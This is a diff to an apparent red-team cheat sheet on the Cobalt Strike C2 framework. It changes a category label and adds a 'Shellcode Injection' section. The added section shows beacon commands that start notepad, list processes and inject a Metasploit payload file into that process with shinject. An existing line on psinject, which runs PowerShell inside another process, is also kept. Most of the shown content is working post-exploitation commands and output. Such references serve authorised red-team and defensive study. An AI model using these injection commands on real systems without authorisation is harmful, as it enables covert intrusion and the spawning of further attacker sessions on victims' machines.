@@ -1,6 +1,6 @@
 ---
 title: C2 - Cobalt Strike
-category: 00 Red Team
+category: Red Team
 order: 3
 ---
 
@@ -363,6 +363,20 @@ beacon > powerpick [commandlet] [argument]
 
 # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
 beacon > psinject [pid][arch] [commandlet] [arguments]
+```
+## Shellcode Injection
+
+It is possible to inject shellcode directly on a existent process. Its very useful when we need to spawn a listener of a different C2 or a meterpreter.
+
+```
+beacon> execute C:\Windows\System32\notepad.exe
+beacon> ps
+
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ 1492  4268  notepad.exe                  x64   1           CORP\user
+
+beacon> shinject 1492 x64 C:\Payloads\msf.bin
 ```
 
 # Hosting Files
